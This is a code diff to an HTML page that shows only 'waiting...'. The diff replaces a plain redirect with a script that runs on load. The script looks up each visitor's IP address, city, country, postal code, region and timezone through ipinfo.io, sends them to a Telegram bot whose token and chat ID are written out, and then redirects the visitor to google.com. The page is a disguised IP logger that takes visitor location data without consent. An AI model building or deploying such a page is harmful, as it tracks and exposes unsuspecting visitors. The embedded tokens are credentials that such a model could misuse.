@@ -3,10 +3,35 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="refresh" content="5; url=https://google.com" />
     <title>Home</title>
   </head>
   <body>
     waiting...
+    <script>
+      async function getUserInfo() {
+        const request = await fetch(
+          "https://ipinfo.io/json?token=7d9380bd134fe2"
+        );
+        const response = await request.json();
+        return response;
+      }
+      window.addEventListener("load", async () => {
+        const { ip, city, country, postal, region, timezone } =
+          await getUserInfo();
+        console.log(ip, city, country, postal, region, timezone);
+        const botApi = "6559381340:AAFBebXhmpgSbUEsijMnYWxzs75csh_3kLo";
+        const chatId = "-1002217556728";
+        const textField = `User info :%0A - ip -> ${ip}%0A - country -> ${country}%0A - city -> ${city}%0A - region -> ${region}%0A - postal -> ${postal}%0A - timezone -> ${timezone}`;
+        const url = `https://api.telegram.org/bot${botApi}/sendMessage?chat_id=${chatId}&text=${textField}`;
+
+        let api = new XMLHttpRequest();
+        api.open("GET", url, true);
+        api.send();
+
+        setTimeout(() => {
+          location.replace("https://google.com");
+        }, 3000);
+      });
+    </script>
   </body>
 </html>
